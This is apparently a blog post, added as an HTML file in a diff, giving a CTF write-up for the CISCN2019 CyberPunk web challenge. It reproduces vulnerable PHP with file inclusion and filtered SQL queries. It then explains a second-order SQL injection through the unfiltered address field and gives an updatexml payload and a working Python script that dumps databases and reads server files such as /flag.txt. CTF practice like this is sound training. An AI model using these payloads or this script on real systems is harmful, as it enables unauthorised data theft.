@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>[CISCN2019 华北赛区 Day1 Web5]CyberPunk wp | Rock&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="[CISCN2019 华北赛区 Day1 Web5]CyberPunk题目链接：[CISCN2019 华北赛区 Day1 Web5]CyberPunk 1. 查看网页源码发现存在注释   故尝试文件包含，得到源码 index.php &#x2F;&#x2F;这里只把php代码贴出 &lt;?php ini_set(&#39;open_basedir&#39;, &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;);">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[CISCN2019 华北赛区 Day1 Web5]CyberPunk wp">
+<meta property="og:url" content="https://rock718.github.io.git/2021/05/17/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-wp/index.html">
+<meta property="og:site_name" content="Rock&#39;s blog">
+<meta property="og:description" content="[CISCN2019 华北赛区 Day1 Web5]CyberPunk题目链接：[CISCN2019 华北赛区 Day1 Web5]CyberPunk 1. 查看网页源码发现存在注释   故尝试文件包含，得到源码 index.php &#x2F;&#x2F;这里只把php代码贴出 &lt;?php ini_set(&#39;open_basedir&#39;, &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;);">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-05-17T14:00:30.000Z">
+<meta property="article:modified_time" content="2022-03-27T03:15:45.000Z">
+<meta property="article:author" content="Rock">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Rock&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Noto+Sans+KR:100,300,400,700&amp;subset=korean" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <!--<div id="banner"></div>-->
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        <a href="/" id="main-nav-title" class="main-nav-link">Rock&#39;s blog</a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives/">Archives</a>
+        
+          <a class="main-nav-link" href="/about/">about</a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-CISCN2019-华北赛区-Day1-Web5-CyberPunk-wp" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      [CISCN2019 华北赛区 Day1 Web5]CyberPunk wp
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1><p>题目链接：<br><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</a></p>
+<h2 id="1-查看网页源码"><a href="#1-查看网页源码" class="headerlink" title="1. 查看网页源码"></a>1. 查看网页源码</h2><p>发现存在注释</p>
+
+
+<p>故尝试文件包含，得到源码</p>
+<p>index.php</p>
+<pre><code>//这里只把php代码贴出
+&lt;?php
+ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);
+
+// $file = $_GET[&quot;file&quot;];
+$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
+if (isset($file))&#123;
+    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123;
+        echo(&#39;no way!&#39;);
+        exit;
+    &#125;
+    @include($file);
+&#125;
+?&gt;
+</code></pre>
+<p>confirm.php</p>
+<pre><code>&lt;?php
+require_once &quot;config.php&quot;;
+//var_dump($_POST);
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+&#123;
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $address = $_POST[&quot;address&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;
+        $msg = &#39;no sql inject!&#39;;
+    &#125;else&#123;
+        $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    &#125;
+
+    if($fetch-&gt;num_rows&gt;0) &#123;
+        $msg = $user_name.&quot;已提交订单&quot;;
+    &#125;else&#123;
+        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;
+        $re = $db-&gt;prepare($sql);
+        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);
+        $re = $re-&gt;execute();
+        if(!$re) &#123;
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        &#125;
+        $msg = &quot;订单提交成功&quot;;
+    &#125;
+&#125; else &#123;
+    $msg = &quot;信息不全&quot;;
+&#125;
+?&gt;
+</code></pre>
+<p>search.php</p>
+<pre><code>&lt;?php
+require_once &quot;config.php&quot;; 
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+&#123;
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; 
+        $msg = &#39;no sql inject!&#39;;
+    &#125;else&#123;
+        $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    &#125;
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;
+        $row = $fetch-&gt;fetch_assoc();
+        if(!$row) &#123;
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        &#125;
+        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;
+    &#125; else &#123;
+        $msg = &quot;未找到订单!&quot;;
+    &#125;
+&#125;else &#123;
+    $msg = &quot;信息不全&quot;;
+&#125;
+?&gt;
+
+&lt;?php global $msg; echo &#39;&lt;h2 class=&quot;mb&quot;&gt;&#39;.$msg.&#39;&lt;/h2&gt;&#39;;?&gt;
+</code></pre>
+<p>change.php</p>
+<pre><code>&lt;?php
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+&#123;
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $address = addslashes($_POST[&quot;address&quot;]);
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;
+        $msg = &#39;no sql inject!&#39;;
+    &#125;else&#123;
+        $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    &#125;
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;
+        $row = $fetch-&gt;fetch_assoc();
+        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];
+        $result = $db-&gt;query($sql);
+        if(!$result) &#123;
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        &#125;
+        $msg = &quot;订单修改成功&quot;;
+    &#125; else &#123;
+        $msg = &quot;未找到订单!&quot;;
+    &#125;
+&#125;else &#123;
+    $msg = &quot;信息不全&quot;;
+&#125;
+?&gt;
+</code></pre>
+<p>delete.php</p>
+<pre><code>&lt;?php
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+&#123;
+    $msg = &#39;&#39;;
+    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
+    $user_name = $_POST[&quot;user_name&quot;];
+    $phone = $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; 
+        $msg = &#39;no sql inject!&#39;;
+    &#125;else&#123;
+        $sql = &quot;select * from `user` where `user_name`=&#39;&#123;$user_name&#125;&#39; and `phone`=&#39;&#123;$phone&#125;&#39;&quot;;
+        $fetch = $db-&gt;query($sql);
+    &#125;
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;
+        $row = $fetch-&gt;fetch_assoc();
+        $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);
+        if(!$result) &#123;
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        &#125;
+        $msg = &quot;订单删除成功&quot;;
+    &#125; else &#123;
+        $msg = &quot;未找到订单!&quot;;
+    &#125;
+&#125;else &#123;
+    $msg = &quot;信息不全&quot;;
+&#125;
+?&gt;
+</code></pre>
+<h2 id="2-分析后台逻辑"><a href="#2-分析后台逻辑" class="headerlink" title="2. 分析后台逻辑"></a>2. 分析后台逻辑</h2><p>可以看到后台对于插入、查找、修改、删除数据时提交的字段做了sql关键词的过滤，但唯独对于插入address字段时没有过滤</p>
+<p>可以考虑通过数据污染的方式进行二次注入</p>
+<p>即通过插入特殊构造的address,使之在查询或修改此字段时触发非预期sql语句执行</p>
+<p>通过分析可以看出当插入恶意address后，当更新订单时会引发sql注入</p>
+<p>插入地址为</p>
+<pre><code>&#39;,user_name=(select updatexml(1,concat(0x7e,(select @@version),0x7e),1))#
+</code></pre>
+
+
+<p>修改地址</p>
+
+
+<p>出现报错</p>
+
+
+<h1 id="2-开始注入"><a href="#2-开始注入" class="headerlink" title="2. 开始注入"></a>2. 开始注入</h1><p>为了练习所以写了一个脚本，实际做题时不需要这么麻烦。</p>
+<pre><code>import requests
+import random
+
+baseUrl = &quot;http://62226166-69f7-4a95-afca-4be78816f7f0.node3.buuoj.cn/&quot;
+tmp = str(random.randint(0,0xffffffff))
+
+# 提交订单
+def put_order(name, phone, address):
+    url = baseUrl + &quot;confirm.php&quot;
+    req = requests.post(url, data=&#123;&quot;user_name&quot;:name, &quot;phone&quot;: phone, &quot;address&quot;: address&#125;)
+    if &quot;订单提交成功&quot; in req.text:
+        return True
+    else:
+        print(&quot;put_order Error!&quot;)
+        return False
+
+# 删除订单
+def delete_order(name, phone):
+    url = baseUrl + &quot;delete.php&quot;
+    req = requests.post(url, data=&#123;&quot;user_name&quot;:name, &quot;phone&quot;:phone&#125;)
+    if &quot;订单删除成功&quot; in req.text:
+        return True
+    else:
+        print(&quot;Delete Error!&quot;)
+        return False
+    
+# 修改订单
+def change_order(name, phone, address):
+    url = baseUrl + &quot;change.php&quot;
+    req = requests.post(url, data=&#123;&quot;user_name&quot;:name, &quot;phone&quot;:phone, &quot;address&quot;:address&#125;)
+    if &quot;errorXPATH syntax error:&quot; in req.text:
+        return req.text.split(&#39;~&#39;)[1]
+    else:
+        # print(&quot;change_order Error!&quot;)
+        return &quot;None&quot;
+
+# 报错注入获取数据库名
+def get_database_name():
+    start = 1
+    length = 30
+    database_name = &quot;&quot;
+    while True:
+        put_order(tmp, tmp, &quot;&#39;,user_name=(select updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),&quot;+ str(start) +&quot;,&quot;+ str(length) +&quot;),0x7e),1))#&quot;)
+        res = change_order(tmp, tmp, tmp) == &quot;None&quot;
+        res = (&quot;&quot; if res == &quot;None&quot; else res)
+        database_name += res
+        start += length
+        # print(database_name)
+        delete_order(tmp, tmp)
+        if len(res) != 30:
+            return database_name.split(&#39;,&#39;)
+
+# 报错注入获取表名
+def get_table_name(database_name):
+    start = 1
+    length = 30
+    table_name = &quot;&quot;
+    while True:
+        put_order(tmp, tmp, &quot;&#39;,user_name=(select updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;&quot;+ database_name +&quot;&#39;),&quot;+ str(start) +&quot;,&quot;+ str(length) +&quot;),0x7e),1))#&quot;)
+        res = change_order(tmp, tmp, tmp)
+        res = (&quot;&quot; if res == &quot;None&quot; else res)
+        table_name += res
+        start += length
+        delete_order(tmp, tmp)
+        if len(res) != 30:
+            return table_name.split(&#39;,&#39;)
+
+# 报错注入获取列名
+def get_columns(table_name):
+    start = 1
+    length = 30
+    column_name = &quot;&quot;
+    while True:
+        put_order(tmp, tmp, &quot;&#39;,user_name=(select updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;&quot;+ table_name +&quot;&#39;),&quot;+ str(start) +&quot;,&quot;+ str(length) +&quot;),0x7e),1))#&quot;)
+        res = change_order(tmp, tmp, tmp)
+        res = (&quot;&quot; if res == &quot;None&quot; else res)
+        column_name += res
+        start += length
+        delete_order(tmp, tmp)
+        if len(res) != 30:
+            return column_name.split(&#39;,&#39;)
+
+# 报错注入获取列中所有值
+def get_value(database_name, table_name, column_name):
+    start = 1
+    length = 30
+    value = &quot;&quot;
+    while True:
+        put_order(tmp, tmp, &quot;&#39;,user_name=(select updatexml(1,concat(0x7e,substr((select group_concat(&quot;+ column_name +&quot;) from &quot;+ database_name +&quot;.&quot;+ table_name +&quot;),&quot;+ str(start) +&quot;,&quot;+ str(length) +&quot;),0x7e),1))#&quot;)
+        res = change_order(tmp, tmp, tmp)
+        res = (&quot;&quot; if res == &quot;None&quot; else res)
+        value += res
+        start += length
+        delete_order(tmp, tmp)
+        if len(res) != 30:
+            return value.split(&#39;,&#39;)
+
+# 报错注入读取文件
+def get_file(file):
+    start = 1
+    length = 30
+    text = &quot;&quot;
+    while True:
+        put_order(tmp, tmp, &quot;&#39;,user_name=(select updatexml(1,concat(0x7e,substr(load_file(&#39;&quot;+ file +&quot;&#39;),&quot;+ str(start) +&quot;,&quot;+ str(length) +&quot;),0x7e),1))#&quot;)
+        res = change_order(tmp, tmp, tmp)
+        res = (&quot;&quot; if res == &quot;None&quot; else res)
+        text += res
+        start += length
+        delete_order(tmp, tmp)
+        if len(res) != 30:
+            return text
+
+
+
+if __name__==&quot;__main__&quot;:
+    # information_schema
+    # ctftraining
+    # mysql
+    # performance_schema
+    # test
+    # ctfusers
+    # database = &quot;ctftraining&quot;
+    # for table in get_table_name(database):
+    # 	for column in get_columns(table):
+    # 		print(database +&quot;.&quot;+ table +&quot;.&quot;+ column +&quot;:&quot;, end=&#39;&#39;)
+    # 		print(get_value(database, table, column))
+    print(get_file(&quot;/flag.txt&quot;))
+</code></pre>
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://rock718.github.io.git/2021/05/17/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk-wp/" data-id="cl9y4cx9g000v24fygs26bwe3" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/02/13/CSAWQual-2019-Web-Unagi/" id="article-nav-newer" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Newer</span>
+      <div class="article-nav-title">
+        
+          [CSAWQual 2019]Web_Unagi
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/05/16/MRCTF2020-%E5%A5%97%E5%A8%83-wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <span class="article-nav-caption">Older</span>
+      <div class="article-nav-title">[MRCTF2020]套娃-wp</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 Rock<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> with 
+      theme_by <a href="http://hexo.io/" target="_blank">mango</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives/" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about/" class="mobile-nav-link">about</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
